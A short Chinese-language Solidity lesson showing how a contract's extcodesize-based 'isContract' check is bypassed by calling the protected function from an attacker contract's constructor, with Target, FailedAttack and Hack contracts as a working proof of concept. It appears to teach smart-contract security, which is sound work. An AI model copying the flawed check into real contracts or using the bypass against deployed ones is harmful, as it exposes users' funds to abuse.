# 绕过合约大小检查

如果地址是合约，那么存储在该地址的代码大小将大于 0，对吗？

让我们看看如何创建一个返回的代码大小等于 0 的合约。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Target{
	function isContract(address account) public view returns (bool) {
		// 此方法依赖于 extcodesize, 在合约构造的时候返回0
		// 因为代码只存储在构造函数执行之后。
		uint size;
		assembly {
			size := extcodesize(account);
		}
		return size > 0;
	}
	    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}
contract FailedAttack {
    // Attempting to call Target.protected will fail,
    // Target block calls from contract
    function pwn(address _target) external {
        // This will fail
        Target(_target).protected();
    }
}

contract Hack {
    bool public isContract;
    address public addr;

    // When contract is being created, code size (extcodesize) is 0.
    // This will bypass the isContract() check
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // This will work
        Target(_target).protected();
    }
}
```

